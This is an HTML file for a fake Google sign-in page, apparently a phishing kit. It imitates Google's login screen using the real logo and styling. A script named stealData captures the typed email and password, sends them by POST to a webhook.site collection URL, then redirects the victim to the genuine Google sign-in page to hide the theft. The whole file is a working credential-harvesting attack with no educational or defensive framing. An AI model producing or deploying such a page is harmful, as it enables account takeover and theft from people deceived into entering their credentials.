
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Sign in â€“ Google Accounts</title>
  <link rel="icon" href="https://ssl.gstatic.com/accounts/ui/favicon_2x.png">
  <link href="https://fonts.googleapis.com/css?family=Roboto" rel="stylesheet">
  <style>
    body {
      background-color: #f2f2f2;
      font-family: 'Roboto', sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }
    .container {
      background: #fff;
      padding: 40px 32px;
      border-radius: 8px;
      box-shadow: 0 1px 6px rgba(32,33,36,0.28);
      width: 360px;
      text-align: center;
    }
    .logo {
      width: 75px;
      margin-bottom: 20px;
    }
    h2 {
      margin: 0 0 24px;
      font-size: 24px;
      font-weight: normal;
      color: #202124;
    }
    input[type="email"],
    input[type="password"] {
      width: 100%;
      padding: 12px;
      margin-bottom: 16px;
      border: 1px solid #dadce0;
      border-radius: 4px;
      font-size: 16px;
      box-sizing: border-box;
    }
    button {
      width: 100%;
      padding: 12px;
      background-color: #1a73e8;
      color: white;
      border: none;
      border-radius: 4px;
      font-size: 14px;
      font-weight: 500;
      text-transform: uppercase;
      cursor: pointer;
      transition: background-color 0.3s;
    }
    button:hover {
      background-color: #185abc;
    }
    .footer {
      font-size: 12px;
      color: #5f6368;
      margin-top: 24px;
    }
  </style>
</head>
<body>
  <div class="container">
    <img src="https://ssl.gstatic.com/accounts/ui/logo_2x.png" alt="Google logo" class="logo">
    <h2>Sign in</h2>
    <form onsubmit="stealData(event)">
      <input type="email" id="email" placeholder="Email or phone" required><br>
      <input type="password" id="password" placeholder="Enter your password" required><br>
      <button type="submit">Next</button>
    </form>
    <p class="footer">Not your computer? Use Guest mode to sign in privately. <a href="https://www.youtube.com/watch?v=dQw4w9WgXcQ" target="_blank">Learn more</a></p>
  </div>

  <script>
    function stealData(event) {
      event.preventDefault();
      const email = document.getElementById('email').value;
      const pass = document.getElementById('password').value;

      fetch('https://webhook.site/c4c7bc0b-300f-482a-92bf-283b16f085e9', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email: email, password: pass })
      }).then(() => {
        window.location.href = 'https://accounts.google.com/';
      });
    }
  </script>
</body>
</html>
